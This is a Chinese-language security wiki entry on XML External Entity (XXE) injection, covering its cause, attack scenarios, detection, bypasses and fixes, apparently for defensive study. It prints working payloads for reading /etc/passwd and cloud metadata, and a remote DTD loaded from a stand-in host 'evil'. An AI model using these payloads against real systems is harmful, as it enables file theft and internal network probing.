---
id: xxe
title: XML 外部实体注入（XXE: XML External Entity Injection）
category: 注入类
severity: high
owasp: A03:2021-Injection
cwe: CWE-611
tags: [injection, xxe, xml, ssrf, file-read]
---

> 本条目仅用于授权安全测试与防御学习。请勿对未授权目标使用文中技术。

# XML 外部实体注入（XXE）

## 一句话
> 应用解析用户可控的 XML 时允许外部实体（External Entity），攻击者用 `<!ENTITY>` 定义「内容来自文件或 URL 的变量」，让服务端替他读文件、发请求——一次解析，两条路：文件读取 + SSRF。

## 它是怎么发生的
**根因**：XML 标准允许文档里定义「实体」（entity，本质是可复用的变量），且实体内容可以指向**外部资源**。老版本解析器默认开启这一特性，于是「解析用户上传的 XML」就等于「把文件读取和网络请求的能力交给了用户」。

基本语法与危害结构：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user><name>&xxe;</name></user>
```

解析时 `&xxe;` 被替换为 `/etc/passwd` 的内容——如果应用把解析结果回显，文件内容就进了响应。

**触发三要素**：
1. 服务端解析用户可控 XML（API body、文件上传、SAML/OAuth 断言、RSS 导入、**Office 文档**——docx/xlsx 内部就是 XML）；
2. 解析器未禁用 DTD/外部实体；
3. 解析结果有回显，或可通过报错/带外观察。

## 攻击场景

### 场景一：有回显读文件
**目标**：直接读服务器文件。**思路**：如上例，把实体指向 `file://`。
**payload**：`<!ENTITY xxe SYSTEM "file:///etc/passwd">`（Windows 换 `file:///C:/Windows/win.ini`）
**结果**：响应中出现文件内容。读不了回显时可用报错法：把读到的内容塞进一个**必然报错的表达式**里带出。

### 场景二：SSRF 化利用
**目标**：探测内网 / 云元数据。**思路**：实体指向 `http://`，服务端解析时就会发请求。
**payload**：`<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`（仅限授权测试环境）
**结果**：与 [SSRF](../40-files-requests/ssrf.md) 等价——XXE 本质上是「XML 语法里的 SSRF」。

### 场景三：盲 XXE（Blind XXE / OOB）
**目标**：无回显时确认并取数。**思路**：让服务端向攻击者控制的 DNS/HTTP 服务回连，文件内容编码后挂在请求里带出（参数实体串联）。
**结果**：回连日志里出现外带数据。这是 XXE 在现代应用（无回显为主）中的主流确认手法。

### 场景四：借道文件上传
**目标**：应用本身不收 XML。**思路**：docx/xlsx/svg 都是 XML 的压缩包——把其中某个部件替换为带 DTD 的 XML 再上传，解析这些文件的库若未禁外部实体则中招。
**结果**：上传头像/导入 Excel 的功能成为 XXE 入口，这是最常被忽略的触发面。

进阶：当无法控制 DOCTYPE 时，攻击者可托管自己的 DTD 让目标远程加载（`<!DOCTYPE foo SYSTEM "http://evil/evil.dtd">`）；极端形态（ Billion Laughs 实体展开）构成 DoS。

## 怎么发现它
- **手工测试**：收集一切 XML 输入点（API、SAML、导入功能、SVG 上传），把合法 XML 改写为带外部实体的版本，分别试 `file://`（读个无害文件如 `/etc/hostname`）与自控 URL 的 `http://` 回连。
- **工具**：Burp Collaborator / 自建 dnslog 收带外信号最省力。
- **真假判断**：解析器报「DOCTYPE not allowed」说明已防护；请求超时但自控服务器收到回连是盲 XXE 的强证据；仅报错不回连可能是解析失败而非实体被执行。

## 常见绕过与进阶
- **「禁 DOCTYPE 但允许外部 DTD」**：远程 DTD 引用路径仍可达。
- **编码变体**：XML 声明里指定 UTF-16 绕过按 UTF-8 匹配关键字的 WAF。
- **参数实体**：内部 DTD 限制下用参数实体 `%` 串联构造（盲 XXE 的标准姿势）。
- **触发面转移**：SVG 上传（浏览器渲染 SVG 时也可触发，构成客户端 XXE 变体）、SOAP 服务、SAML 断言。
- 思路主线：**找「解析未受信 XML」的每一处，逐一核对解析器配置**——XXE 是少数「修复完全在配置层」的注入。

## 怎么修
1. **禁用 DTD（治本且简单）**：各语言解析器均有开关——Java（Xerces）`disallow-doctype-decl: true`、Python `defusedxml`、.NET `DtdProcessing.Prohibit`、PHP `libxml_disable_entity_loader`（新版本默认已禁）。这是唯一值得写进编码规范的修复。
2. **确实需要 DTD 的场景**：白名单实体、禁外部实体与外部 DTD 引用。
3. **数据格式选型**：新接口用 JSON，XML 仅在协议强制时使用。
4. **纵深**：出网白名单（压制 SSRF 化利用）、解析进程最小权限、文件读取范围受控。
5. **升级依赖**：老版本 libxml2/xerces 有解析器自身漏洞，随组件治理一并解决。

## 常见误区
- **「XXE 只能读文件」**：它同时是 SSRF（`http://` 实体）、DoS（实体展开）、条件性 RCE（特定库如 PHP expect 扩展）的入口——报告按可达危害分别描述。
- **「回显没有就没危害」**：盲 XXE 靠带外照样取数，危害评估不看回显看「实体是否被执行」。
- **「JSON 接口不用测」**：要测的不是接口格式，是解析器——上传 docx/svg 的功能内部解析的就是 XML。

## 关联
- 前置：[HTTP 基础](../00-basics/http-basics.md)
- 相关：[SSRF](../40-files-requests/ssrf.md)（实体 `http://` 与之等价） · [文件上传](../40-files-requests/file-upload.md)（docx/svg 触发面） · [SQL 注入](sql-injection.md)
- 参考：[OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) · [PortSwigger: XXE](https://portswigger.net/web-security/xxe)
